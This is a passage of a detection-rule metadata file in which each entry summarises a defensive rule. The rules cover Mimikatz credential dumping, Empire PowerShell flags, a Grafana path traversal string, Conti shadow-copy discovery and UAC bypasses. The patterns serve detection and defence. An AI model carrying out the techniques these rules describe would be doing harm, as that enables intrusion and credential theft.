  Summary: This rule detects the import of an alternate data stream using the regini.exe
    utility, which can be used to modify registry keys. This activity is indicative
    of potential malicious behavior where attackers may attempt to evade defenses
    and alter system configurations through unconventional means.
  Updated-Date: '2024_09_03'
7794fa3c-edea-4cff-bec7-267dd4770fd7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7613113eb1b5f786c5815225231ef8e1
  Ruleset: core
  Summary: This rule detects the possible collection of data from the clipboard through
    the execution of the osascript binary on macOS systems. By monitoring for specific
    command-line arguments, specifically those that include the terms 'osascript',
    ' -e ', and 'clipboard', it aims to identify suspicious activities that may pertain
    to clipboard data access. This method is often leveraged by offensive actors using
    AppleScript to attack macOS systems.
  Updated-Date: '2024_09_03'
779c8c12-0eb1-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cbab46c805268ecf469b586ec4919a15
  Ruleset: core
  Summary: This rule detects the obfuscated use of stdin to execute PowerShell commands,
    often used for malicious activities such as defense evasion and execution. It
    identifies specific patterns in PowerShell script block logging that indicate
    the use of cmd.exe with certain parameters to invoke PowerShell in a hidden or
    obfuscated manner, which can be indicative of suspicious behavior or potential
    malware activity.
  Updated-Date: '2024_09_03'
77df53a5-1d78-4f32-bc5a-0e7465bd8f41:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42e7b11646f7fb85f932344bf47d10a9
  Ruleset: sigmahq
  Summary: This rule detects the execution of "gpg.exe" from uncommon locations, primarily
    to identify potential misuse by ransomware and loaders to decrypt or encrypt data.
  Updated-Date: '2024_09_04'
780601d1-6376-4f2a-884e-b8d45599f78c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 15d14b47aadaa2415eeb0af9a6ccdfa1
  Ruleset: sigmahq
  Summary: This rule detects when multi-factor authentication (MFA) is disabled in
    Google Workspace. It monitors events related to the enforcement and allowance
    of strong authentication, specifically targeting changes where the new value is
    set to 'false'. This can indicate a potentially risky configuration change where
    MFA, an essential security measure, is turned off.
  Updated-Date: '2024_09_04'
7806bb49-f653-48d3-a915-5115c1a85234:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d8cffe7e0da9eb01e5fcdb07e2312ef
  Ruleset: emerging-threats
  Summary: This rule detects specific command line executions indicative of activity
    by the APT group Mustang Panda in a targeted attack against the Australian government.
    It identifies commands involving the copying of "SolidPDFCreator.dll" to a specified
    directory and the creation of registry entries related to the "SolidPDFCreator.dll"
    file, ensuring persistence through the Windows "Run" key. This activity is significant
    due to its association with a sophisticated threat actor known for targeted espionage
    campaigns.
  Updated-Date: '2024_09_03'
782d6f3e-4c5d-4b8c-92a3-1d05fed72e63:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e6bd5dc55452e65098c567c70e4bc10
  Ruleset: core
  Summary: This rule detects the usage of the `netsh.exe` command to configure port
    forwarding for port 3389, which is the default port for Remote Desktop Protocol
    (RDP). The detection focuses on specific command line parameters that indicate
    the configuration of this port forwarding. The activity is often associated with
    lateral movement, defense evasion, and command-and-control tactics, and it may
    signify an attempt to bypass network restrictions by tunneling RDP traffic.
  Updated-Date: '2024_09_03'
7857f021-007f-4928-8b2c-7aedbe64bb82:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e2f0157759174a702b0b9d86d1323e8
  Ruleset: emerging-threats
  Summary: This rule detects network communication associated with the Turla ComRAT
    malware. ComRAT, linked to the Turla group, employs specific URL patterns in its
    command-and-control operations. Detection focuses on HTTP requests containing
    the string "/index/index.php?h=", which indicates potential ComRAT activity.
  Updated-Date: '2024_09_03'
786cdae8-fefb-4eb2-9227-04e34060db01:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35509a1b7d46591a9eda6889b06274da
  Ruleset: sigmahq
  Summary: This rule detects network connections initiated by "wordpad.exe" over uncommon
    destination ports. Such activity may indicate potential process injection typically
    associated with beacons or similar malicious mechanisms, signaling possible compromise
    or command-and-control communication attempts.
  Updated-Date: '2024_09_04'
7892ec59-c5bb-496d-8968-e5d210ca3ac4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e89555af972c111fc54fd473f0389a9f
  Ruleset: sigmahq
  Summary: This rule detects file names with specific patterns indicative of activity
    involving exported or stolen DPAPI backup keys and certificates. These patterns
    are associated with well-known tools like Mimikatz and DSInternals, which are
    often used for extracting these sensitive files. The detection focuses on file
    names beginning with 'ntds_capi_', 'ntds_legacy_', or 'ntds_unknown_', and ending
    with extensions such as '.cer', '.key', '.pfx', and '.pvk'.
  Updated-Date: '2024_09_04'
7899144b-e416-4c28-b0b5-ab8f9e0a541d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3f1b765b9f2493b30ee1bdb726c997bf
  Ruleset: sigmahq
  Summary: This rule detects when an application within the Okta platform is either
    modified or deleted. The specific events monitored are those indicating an update
    or deletion in the application's lifecycle.
  Updated-Date: '2024_09_04'
789d4e19-6d07-4be9-9587-0e5a6b460f6d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 93d394ab9071d4ae2fd50d085d3e23bf
  Ruleset: securityonion-resources
  Summary: This rule detects when the SMB service on a Security Onion Intrusion Detection
    Honeypot (IDH) node has been accessed. SMB (Server Message Block) is a network
    file sharing protocol, and monitoring its activity can identify potential unauthorized
    access or malicious activity. The detection relies on logs specific to the OpenCanary
    honeypot framework, which allows the simulation of various services for monitoring
    and threat intelligence purposes. This type of access could indicate an attempt
    to exploit vulnerabilities or gather information from the honeypot system.
  Updated-Date: '2024_08_07'
78a34b67-3c39-4886-8fb4-61c46dc18ecd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 60ef45d9cbe13e8084f65253b41411ff
  Ruleset: sigmahq
  Summary: This rule detects when a user has deleted an unusually large volume of
    files as reported by Microsoft Cloud App Security within the Microsoft 365 environment.
    This event is captured through the Security Compliance Center with a focus on
    successful deletion activities that could indicate a potential impact as outlined
    by security threat methodologies.
  Updated-Date: '2024_09_04'
78aa1347-1517-4454-9982-b338d6df8343:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 69ae89133dab7fa79214b5586818743b
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell commands and scripts that utilize
    the MsXml COM Object, including actions like creating new objects, using COM objects,
    and interacting with MsXml2.XmlHttp. PowerShell, a robust command-line interface
    and scripting environment inherent to Windows operating systems, can be exploited
    by adversaries for actions such as information discovery and code execution. This
    detection helps identify potentially malicious use of PowerShell, which may signify
    an attempt to abuse these capabilities for unauthorized purposes.
  Updated-Date: '2024_09_04'
78bc5783-81d9-4d73-ac97-59f6db4f72a8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 44b5444b4462d93bf4a18270b677fa31
  Ruleset: core
  Summary: This rule detects potentially significant antivirus events in the Windows
    application log by identifying known virus signature names and malware keywords.
    It searches for terms such as 'Adfind,' 'Backdoor.Cobalt,' 'Mimikatz,' 'TeslaCrypt,'
    and others associated with various malware and hacking tools. The purpose is to
    flag suspicious activities that may indicate the presence of malicious software
    on the system.
  Updated-Date: '2024_09_03'
78cc2dd2-7d20-4d32-93ff-057084c38b93:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd0264a36c955d19d46aa4a989272a40
  Ruleset: core
  Summary: This rule detects a highly relevant antivirus alert indicating the presence
    of a password dumper. It identifies specific signatures that start with 'PWS'
    or contain references to known password dumping tools such as DumpCreds, Mimikatz,
    LsassDump, and Rubeus. These tools are often used for credential access and can
    be indicative of malicious activity targeting the extraction of passwords stored
    in memory or other secure storage methods. Detection of these signatures is considered
    critical for maintaining security and mitigating unauthorized access attempts.
  Updated-Date: '2024_09_03'
78d5cab4-557e-454f-9fb9-a222bd0d5edc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a8fd745f7e6dbec553c2db7adfeb7585
  Ruleset: core
  Summary: This rule detects successful logon attempts via SMB from public IP addresses
    on a Windows system. Such activity may indicate that an SMB port is exposed to
    the public internet, potentially allowing unauthorized access. The rule monitors
    for Event ID 4624 with LogonType 3, filtering out local and private IP ranges,
    as well as unspecified IP addresses, to focus on genuine external access attempts.
    While legitimate use cases for public SMB access can exist, these connections
    generally warrant further investigation due to their potential security risks.
  Updated-Date: '2024_09_03'
790317c0-0a36-4a6a-a105-6e576bf99a14:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6458b999ed9c53dcc169f515445778f0
  Ruleset: sigmahq
  Summary: This rule detects potential COM object hijacking through the modification
    of default system CLSID values. COM object hijacking can be a persistence technique
    used by malware to execute arbitrary code when a specific COM object is invoked.
    The rule identifies suspicious modifications in the Windows registry involving
    default values within paths that indicate COM object initialization. It particularly
    focuses on specific CLSIDs and directories that are commonly targeted, such as
    temporary folders and startup program locations. The detection is designed to
    capture unauthorized changes that might indicate malicious activity, aligning
    with known attack methods and locations.
  Updated-Date: '2024_09_04'
79609c82-a488-426e-abcf-9f341a39365d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 61aaddf86f34e92cbfe356e7f8f7e2b7
  Ruleset: sigmahq
  Summary: This rule detects the removal of all rules from the Windows Defender Firewall
    configuration, which may indicate an attempt to evade security measures. It monitors
    specific event IDs to identify such activities and excludes legitimate system
    processes like 'svchost.exe' and 'MsMpEng.exe' to reduce false positives.
  Updated-Date: '2024_09_04'
797011dc-44f4-4e6f-9f10-a8ceefbe566b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 93fc42b9bcacbe1e027816e5747923d8
  Ruleset: core
  Summary: This rule detects a WMI backdoor within Microsoft Exchange Transport Agents
    by monitoring for processes associated with WMI event filters. Specifically, it
    identifies instances where the "EdgeTransport.exe" process is the parent process,
    while excluding common legitimate processes like "conhost.exe" and "OleConverter.exe"
    from analysis to reduce false positives. This technique highlights attempts to
    establish persistence using WMI mechanisms on a Windows system, which could indicate
    the presence of malicious activity.
  Updated-Date: '2024_09_03'
7993792c-5ce2-4475-a3db-a3a5539827ef:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 62cdc789c5394ce142a8970a9001666a
  Ruleset: emerging-threats
  Summary: This rule detects the execution of MicroScMgmt.exe as a subprocess of WINWORD.EXE,
    an uncommon behavior indicative of an exploit targeting the vulnerability identified
    as CVE-2015-1641. This vulnerability pertains to Microsoft Office, where malicious
    documents can trigger the subprocess, potentially leading to unauthorized system
    exploits.
  Updated-Date: '2024_09_03'
799a5f48-0ac1-4e0f-9152-71d137d48c2a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bb24b029f43f999b7620d25f3f20cf42
  Ruleset: core
  Summary: This rule detects potential DLL sideloading activities where DLL files
    known to be commonly abused are loaded from suspicious locations on a Windows
    system. It focuses on specific DLLs such as 'coreclr.dll', 'facesdk.dll', 'HPCustPartUI.dll',
    'libcef.dll', and 'ZIPDLL.dll' being loaded from directories that are typically
    uncommon for legitimate application activity. These directories include performance
    logs, public user folders, temporary internet files, Windows temporary directories,
    and specific subfolders within individual user directories like 'Favorites', 'Favourites',
    'Contacts', and 'Pictures'. The rule aims to identify malicious behavior by correlating
    the loading of these DLLs from these unusual locations, which could indicate an
    attempt at DLL sideloading, a technique often used by attackers to execute arbitrary
    code.
  Updated-Date: '2024_09_03'
79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 853fde213578a39f89a0fbf0a1bfce68
  Ruleset: sigmahq
  Summary: "This rule detects the potentially malicious use of msiexec.exe, a command-line\
    \ utility for executing installation packages (.msi) on Windows systems. It identifies\
    \ instances where msiexec.exe is executed with specific command-line arguments\
    \ such as '-i', '-package', '-a', '-j', and '-q', which may indicate an attempt\
    \ to silently install software. Furthermore, the rule excludes legitimate usage\
    \ by filtering out cases where msiexec.exe has parent processes located in common\
    \ installer folders such as user\u2019s temp directory and Windows temp directory,\
    \ as well as the CCM folder when executed by Ccm32BitLauncher.exe with system\
    \ integrity. Adversaries could exploit msiexec.exe to run malicious payloads stealthily,\
    \ bypassing detection mechanisms."
  Updated-Date: '2024_09_04'
79aeeb41-8156-4fac-a0cd-076495ab82a1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75c128165ca62fa3f9a7cf5e8064d10a
  Ruleset: emerging-threats
  Summary: This rule detects specific behaviors indicating NotPetya ransomware activity.
    It identifies instances where extracted passwords are communicated back to the
    main module using a named pipe. It also monitors for the deletion of the file
    system journal on drive C and the clearing of Windows event logs through the command
    'wevtutil.' Additionally, the rule looks for specific command-line patterns involving
    'rundll32.exe' and files such as 'dllhost.dat' and 'perfc.dat,' which are associated
    with the ransomware's operations.
  Updated-Date: '2024_09_03'
79b06761-465f-4f88-9ef2-150e24d3d737:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c8d3bbfcd5e9b4a40ef2700f86a8cbf
  Ruleset: core
  Summary: This rule detects the use of the SysInternals ProcDump utility where actions
    such as renaming ProcDump or its output, or moving or copying a dump file are
    performed. It identifies commands in the process creation logs that contain specific
    patterns related to copying or moving ProcDump or its associated .dmp files, particularly
    those involving file names like 'lsass' and patterns typical of ProcDump output.
    The detection criteria encompass distinct command line indicators suggesting such
    evasion techniques.
  Updated-Date: '2024_09_03'
79ce34ca-af29-4d0e-b832-fc1b377020db:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 58da8527f3a5641e43e4162dd4f332cc
  Ruleset: sigmahq
  Summary: This rule detects the execution of "whoami.exe" by privileged accounts,
    which are frequently exploited by threat actors. "Whoami.exe" is a command-line
    utility in Windows used to display information about the current user's identity.
    The rule identifies the presence of this executable by checking for specific user
    accounts such as 'AUTHORI', 'AUTORI', and 'TrustedInstaller'. The detection is
    based on the process creation logs within the Windows operating system.
  Updated-Date: '2024_09_04'
79f4ede3-402e-41c8-bc3e-ebbf5f162581:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7362f88fed6173cc01f3e2d71e9dba35
  Ruleset: core
  Summary: This rule detects the presence of suspicious PowerShell command line parameters
    commonly associated with the Empire framework. Empire is an open-source post-exploitation
    framework that provides a variety of tools for penetration testing and offensive
    operations. The identified command line parameters include specific flags like
    '-NoP', '-sta', '-NonI', and '-W Hidden', and the use of encoded commands, which
    are indicative of malicious activities such as script obfuscation and evasion
    of detection. These parameters suggest attempts to execute PowerShell commands
    in a stealthy manner, avoiding common security controls and monitoring, which
    is a typical behavior in advanced persistent threats and hacking toolkits.
  Updated-Date: '2024_09_03'
7a01183d-71a2-46ad-ad5c-acd989ac1793:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1fabc7a762289ad82a06695deb7e9af9
  Ruleset: core
  Summary: This rule detects the pattern of User Account Control (UAC) Bypass by exploiting
    a path parsing issue in the `winsat.exe` application. Specifically, it looks for
    processes with a high or system integrity level where the parent image appears
    as `\AppData\Local\Temp\system32\winsat.exe` and the parent command line contains
    `C:\Windows \system32\winsat.exe`. This technique is referenced by UACMe project,
    a well-known suite of tools that demonstrates various ways to bypass UAC on Windows
    systems. The rule identifies attempts at privilege escalation and defense evasion
    through this method.
  Updated-Date: '2024_09_03'
7a02e22e-b885-4404-b38b-1ddc7e65258a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bed3e0a33b94f68b90bccfc1ff8ae5bb
  Ruleset: sigmahq
  Summary: This rule detects the creation or modification of scheduled tasks using
    `schtasks.exe` with high privileges on a suspicious schedule type. Specifically,
    it monitors for tasks set to execute on system logon, startup, a one-time basis,
    or when the system is idle. The detection criteria include command lines containing
    references to "NT AUTHORITY\SYSTEM," "SYSTEM," or "HIGHEST," suggesting the task
    is intended to run with elevated permissions. The rule may flag legitimate installers
    that use similar methods, and these should be filtered based on the environment.
  Updated-Date: '2024_09_04'
7a2a22ea-a203-4cd3-9abf-20eb1c5c6cd2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f42b91181ed54f064f93cfbaa6656c04
  Ruleset: sigmahq
  Summary: This rule detects file access requests to the Windows Credential History
    File by uncommon applications, which can indicate credential stealing activity.
    An example scenario would be the use of the mimikatz tool with the "dpapi::credhist"
    function. Mimikatz is a well-known post-exploitation tool used for extracting
    credentials and other sensitive data from Windows systems. The rule filters out
    common access by system applications and directories, focusing on access attempts
    from non-standard sources. This monitoring aims to catch unauthorized attempts
    to read credential history files, which could suggest malicious intent.
  Updated-Date: '2024_09_04'
7a4409fc-f8ca-45f6-8006-127d779eaad9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99a591fa7b3071c87b055e1292edfa48
  Ruleset: sigmahq
  Summary: This rule detects changes to the security groups associated with an Elastic
    Load Balancer (ELB) or Application Load Balancer (ALB). Such modifications might
    signal a misconfiguration that could permit more traffic than necessary into the
    system, or it could indicate that an attacker is attempting to enable new connections
    into a VPC or subnet controlled by the account.
  Updated-Date: '2024_09_04'
7a4d9232-92fc-404d-8ce1-4c92e7caf539:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 139197691a74242e8a17b63cda55414b
  Ruleset: core
  Summary: This rule detects the execution of Stracciatella, a hack tool leveraging
    the SharpPick technique, which runs a PowerShell session from within C#. It focuses
    on identifying instances where AMSI, ETW, and Script Block Logging have been disabled,
    based on specific metadata characteristics of the PE file, such as the executable
    image name, original file name, description, and particular SHA256 hashes.
  Updated-Date: '2024_09_03'
7a74da6b-ea76-47db-92cc-874ad90df734:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 62553741adbf13f197a3c49d50401cdf
  Ruleset: core
  Summary: This rule detects instances of msdt.exe being executed by potentially suspicious
    parent processes, including cmd.exe, cscript.exe, mshta.exe, powershell.exe, pwsh.exe,
    regsvr32.exe, rundll32.exe, schtasks.exe, wmic.exe, wscript.exe, and wsl.exe.
    The activity is associated with the exploitation of CVE-2022-30190, also known
    as Follina. Monitoring this behavior can help identify attempts to evade security
    measures and execute malicious commands on Windows systems.
  Updated-Date: '2024_09_03'
7a922f1b-2635-4d6c-91ef-af228b198ad3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cc2eb17c7d8940cae1235f1aa893bebb
  Ruleset: sigmahq
  Summary: This rule detects the use of obfuscated PowerShell scripts employing the
    COMPRESS OBFUSCATION technique. The detection is based on monitoring Windows Security
    logs for Event ID 4697, which records the installation of services. It specifically
    checks for signs of PowerShell commands that include keywords such as 'new-object',
    'text.encoding]::ascii', 'readtoend', 'system.io.compression.deflatestream', and
    'system.io.streamreader'. These keywords are indicative of compressed and obfuscated
    script execution commonly used in various attack scenarios for defense evasion
    and execution.
  Updated-Date: '2024_09_04'
7aa4e81a-a65c-4e10-9f81-b200eb229d7d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d2ebd885ad3e2854bd2a24d4d4658b9
  Ruleset: sigmahq
  Summary: This rule detects the execution of "VMwareToolBoxCmd.exe" with the "script"
    and "set" flags, which is used to set up a specific script to run for a particular
    virtual machine (VM) state. This can indicate an attempt to establish persistence
    through VMware Tools by configuring scripts that execute based on the state changes
    of the VM.
  Updated-Date: '2024_09_04'
7aa7009a-28b9-4344-8c1f-159489a390df:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0797ac99e8829048c743d73f49b0809d
  Ruleset: core
  Summary: This rule detects the execution of Windows Credential Editor (WCE), a tool
    used for credential access on Windows systems. It identifies specific image hash
    values and command-line patterns associated with WCE to recognize its activity.
    Additionally, it filters out cases where the executable image is associated with
    a known service process to reduce false positives.
  Updated-Date: '2024_09_03'
7aaa5739-12fc-41aa-b98b-23ec27d42bdf:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f29ec3dcbe28fa48ba5ebbaa9bb5e33c
  Ruleset: emerging-threats
  Summary: This rule detects the redirection of Ursnif discovery commands, which typically
    occurs during the initial execution phase of the malware. Ursnif, also known as
    Gozi, is a banking Trojan that commonly targets Windows systems to steal sensitive
    information. The detection focuses on processes where commands executed via 'cmd.exe'
    are redirected to temporary binary files within the user's AppData\local\temp
    directory, originating from 'explorer.exe'. This behavior is indicative of Ursnif's
    attempts to execute and hide its discovery activities, and thus, the rule is essential
    for identifying potential Ursnif infections.
  Updated-Date: '2024_09_03'
7ab8f73a-fcff-428b-84aa-6a5ff7877dea:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 57c95d24b185d0d81f56b414127a0045
  Ruleset: core
  Summary: This rule detects the use of "vim" and its related commands such as "rvim"
    and "vimdiff" to execute a shell or proxy commands. This behavior may be associated
    with privilege escalation, unauthorized command execution, or attempts to break
    out from restricted environments. It observes specific command-line flags and
    command patterns that indicate such behavior, including commands that invoke bash,
    dash, fish, sh, and zsh shells.
  Updated-Date: '2024_09_03'
7ac407cc-0f48-4328-aede-de1d2e6fef41:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e5b03d0f2b0942a4c174f71c6f9da384
  Ruleset: sigmahq
  Summary: This rule detects instances where standard users, who are typically restricted
    in their system privileges, are found to be logging in as part of high privileged
    groups such as the local administrators, domain administrators, schema administrators,
    or enterprise administrators. These high privileged groups have extensive system
    access, and their misuse by standard users can indicate potential security threats
    such as privilege escalation or credential access attacks. The rule leverages
    Event ID 300 from the Microsoft-Windows-LSA/Operational event log to identify
    such occurrences, while also providing mechanisms to exclude known legitimate
    cases where standard users might need elevated access.
  Updated-Date: '2024_09_04'
7b10f171-7f04-47c7-9fa2-5be43c76e535:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a2ff28a1a3207ba61619006248b1945c
  Ruleset: core
  Summary: This rule detects the successful compilation of code using the Visual Basic
    Command Line Compiler, specifically when it involves the Windows Resource to Object
    Converter (`cvtres.exe`). This behavior is significant in the context of defense
    evasion tactics, as it may indicate an attempt to bypass security mechanisms by
    utilizing this legitimate tool in a manner not typically observed within enterprise
    environments.
  Updated-Date: '2024_09_03'
7b14c76a-c602-4ae6-9717-eff868153fc0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bd294c68bcf268fdf47d75d1768bf6d0
  Ruleset: sigmahq
  Summary: This rule detects the execution of NoFilter, a tool designed to exploit
    the Windows Filtering Platform for privilege escalation by identifying specific
    hardcoded policy names. It monitors security events associated with changes to
    the Filtering Platform Policy and looks for policy names and provider contexts
    that contain the string 'RonPolicy'.
  Updated-Date: '2024_09_04'
7b30e0a7-c675-4b24-8a46-82fa67e2433d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d00f7ed222915d34f7a3b86fc4a81c57
  Ruleset: emerging-threats
  Summary: This rule detects the use of a specific command associated with the Conti
    ransomware to locate volume shadow copies on a Windows system. The command in
    question includes "vssadmin list shadows" and typically interacts with a "log.txt"
    file. This activity is indicative of an attempt to identify backup copies, which
    can subsequently be deleted to prevent system recovery from backups after ransomware
    has been deployed.
  Updated-Date: '2024_09_03'
7b33baef-2a75-4ca3-9da4-34f9a15382d8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0314a3e322b44a9f0f344b99c3663e76
  Ruleset: sigmahq
  Summary: 'This rule detects the remote installation of a print driver, which may
    indicate the exploitation of PrintNightmare (CVE-2021-1675). Typically, print
    drivers are installed locally or through group policy, so remote installation
    via RPC functions is uncommon and could signal malicious activity. The rule monitors
    specific RPC operations associated with print driver installation: ''RpcAsyncInstallPrinterDriverFromPackage'',
    ''RpcAsyncAddPrintProcessor'', ''RpcAddPrintProcessor'', ''RpcAddPrinterDriverEx'',
    ''RpcAddPrinterDriver'', and ''RpcAsyncAddPrinterDriver''.'
  Updated-Date: '2024_09_04'
7b434893-c57d-4f41-908d-6a17bf1ae98f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc223d9f58455a23ef9969b9fb5d87a7
  Ruleset: core
  Summary: This rule detects network connections initiated by processes running in
    suspicious or uncommon file system locations on a Windows operating system. The
    rule flags connections if the initiating processes are found in directories such
    as "$Recycle.bin," "Perflogs," "Temp," "Users\Default," "Windows\Fonts," "Windows\IME,"
    "Windows\System32\Tasks," "Windows\Tasks," "config\systemprofile," and "Windows\addins."
    It also excludes connections to certain common or known domains to avoid false
    positives. The detection of such activity is valuable for identifying potential
    command-and-control communications associated with malware or other unauthorized
    processes.
  Updated-Date: '2024_09_03'
7b449a5e-1db5-4dd0-a2dc-4e3a67282538:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5fcf34c69b5bf193c4dcb3a1e92e8066
  Ruleset: core
  Summary: This rule detects the creation of a local hidden user account on a Windows
    system, indicated by event ID 4720 and a username ending with a dollar sign ('$').
    This practice is uncommon and may signal unauthorized persistence activity.
  Updated-Date: '2024_09_03'
7b4f794b-590a-4ad4-ba18-7964a2832205:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7b7f85ffb4f1f742b0430ec9087a5c5b
  Ruleset: core
  Summary: This rule detects the execution of a renamed or portable version of vmnat.exe,
    which can be exploited for DLL side-loading. Vmnat.exe is often associated with
    software like VMware that handles network address translation for virtual machines.
    The rule identifies instances where the original filename is vmnat.exe but has
    been renamed to evade detection mechanisms.
  Updated-Date: '2024_09_03'
7b501acf-fa98-4272-aa39-194f82edc8a3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 551324773355f77de682c45aba8a7482
  Ruleset: emerging-threats
  Summary: This rule detects the creation of "msiexec.exe" in the "bin" directory
    of the ManageEngine SupportCenter Plus, indicating potential exploitation of CVE-2021-44077.
    CVE-2021-44077 relates to a vulnerability in this software, which public proof
    of concept (POC) exploits target to gain unauthorized access or perform malicious
    actions. The detection focuses on file events in Windows systems and is considered
    a high-severity alert.
  Updated-Date: '2024_09_03'
7b544661-69fc-419f-9a59-82ccc328f205:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7103144dc7b28370ca4e2ea263ca6018
  Ruleset: emerging-threats
  Summary: This rule detects registry modifications potentially related to the Ke3chang/TidePool
    malware, which was observed in campaigns in 2019 and 2020. The targeted registry
    keys involve settings for Internet Explorer and Internet Settings, including `Check_Associations`,
    `DisableFirstRunCustomize`, and `IEHarden`. These alterations are indicative of
    the Ke3chang and TidePool malware families, highlighting their defense evasion
    techniques.
  Updated-Date: '2024_09_03'
7b582f1a-b318-4c6a-bf4e-66fe49bf55a5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 327da3a4a50b948e6935b6387f9ca014
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious child processes initiated by the
    ScreenConnect client service. Specifically, it focuses on processes such as `bitsadmin.exe`,
    `cmd.exe`, `curl.exe`, `dllhost.exe`, `net.exe`, `nltest.exe`, `powershell.exe`,
    `pwsh.exe`, `rundll32.exe`, and `wevtutil.exe` that are executed from the `:\Windows\TEMP\ScreenConnect\`
    directory with a `run.cmd` command line. This detection aims to identify abnormal
    activity possibly associated with remote access methods or exploitation attempts
    utilizing these utilities.
  Updated-Date: '2024_09_04'
7b687634-ab20-11ea-bb37-0242ac130002:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5347898ea30997e13ec444628f400a9a
  Ruleset: sigmahq
  Summary: This rule detects the installation of Windows Pcap drivers by monitoring
    specific .sys files associated with network packet capture services. It triggers
    on Event ID 4697, indicating the installation of services with filenames containing
    keywords like 'pcap', 'npcap', 'npf', 'nm3', 'ndiscap', 'nmnt', 'windivert', 'USBPcap',
    and 'pktmon'. This helps identify activities related to network traffic analysis
    and packet capture, which could be used for both legitimate administrative purposes
    and malicious activities related to discovery and credential access.
  Updated-Date: '2024_09_04'
7b72b328-5708-414f-9a2a-6a6867c26e16:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e11051bbc6461de05daa93bb8a5f91d
  Ruleset: emerging-threats
  Summary: This rule detects a successful exploitation of a path traversal vulnerability
    in Grafana identified as CVE-2021-43798. The specific indicators include the presence
    of the string "/../../../../../../../" in the `cs-uri-query` field and a successful
    HTTP status code of 200. Additionally, it monitors for queries accessing various
    public plugins in Grafana. This exploit can potentially allow unauthorized access
    to sensitive files on the server, thereby posing significant security risks. The
    rule is designed to trigger on legitimate responses that indicate the exploitation
